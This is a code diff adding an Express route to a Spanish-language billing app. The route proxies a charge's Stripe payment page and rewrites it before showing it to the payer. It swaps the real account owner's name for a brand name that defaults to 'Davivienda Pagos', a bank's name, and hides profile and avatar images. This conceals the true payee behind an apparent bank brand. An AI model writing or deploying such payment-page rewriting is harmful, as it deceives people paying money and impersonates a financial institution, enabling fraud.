@@ -1622,6 +1622,75 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  app.get("/api/payment-proxy/:chargeId", isAuthenticated, async (req: Request, res: Response) => {
+    try {
+      const chargeId = parseInt(req.params.chargeId);
+      const userId = req.session.userId!;
+
+      const charge = await storage.getAccountChargeById(chargeId);
+      if (!charge) return res.status(404).json({ message: "Cobro no encontrado" });
+
+      const account = await storage.getAccountById(charge.accountId);
+      if (!account || account.userId !== userId) {
+        return res.status(403).json({ message: "No autorizado" });
+      }
+
+      if (!charge.stripePaymentUrl) {
+        return res.status(400).json({ message: "No hay link de pago" });
+      }
+
+      const targetUrl = charge.stripePaymentUrl;
+      const parsedTarget = new URL(targetUrl);
+      const baseOrigin = parsedTarget.origin;
+
+      const fetchRes = await fetch(targetUrl, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          'Accept-Language': 'es-CO,es;q=0.9',
+        },
+      });
+
+      if (!fetchRes.ok) {
+        return res.status(502).json({ message: "No se pudo cargar la pasarela" });
+      }
+
+      let html = await fetchRes.text();
+
+      const ownerNameSetting = await storage.getSetting("checkout_owner_name");
+      const ownerName = ownerNameSetting?.value || "";
+      const brandNameSetting = await storage.getSetting("checkout_brand_name");
+      const brandName = brandNameSetting?.value || "Davivienda Pagos";
+
+      if (ownerName) {
+        const escapedName = ownerName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const nameRegex = new RegExp(escapedName, 'gi');
+        html = html.replace(nameRegex, brandName);
+
+        const parts = ownerName.trim().split(/\s+/);
+        if (parts.length > 1) {
+          const flexiblePattern = parts.map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('\\s+');
+          const flexRegex = new RegExp(flexiblePattern, 'gi');
+          html = html.replace(flexRegex, brandName);
+        }
+      }
+
+      html = html.replace(/(href|src|action)="\/(?!\/)/g, `$1="${baseOrigin}/`);
+      html = html.replace(/(href|src|action)='\/(?!\/)/g, `$1='${baseOrigin}/`);
+
+      html = html.replace(
+        '</head>',
+        `<base href="${baseOrigin}/" /><style>img[src*="profile"],img[src*="avatar"],img[src*="user"]{display:none!important;}</style></head>`
+      );
+
+      res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+      res.send(html);
+    } catch (error) {
+      res.status(500).json({ message: "Error al procesar la pasarela" });
+    }
+  });
+
   // Get charges for the logged-in user's account
   app.get("/api/charges", isAuthenticated, async (req: Request, res: Response) => {
     try {
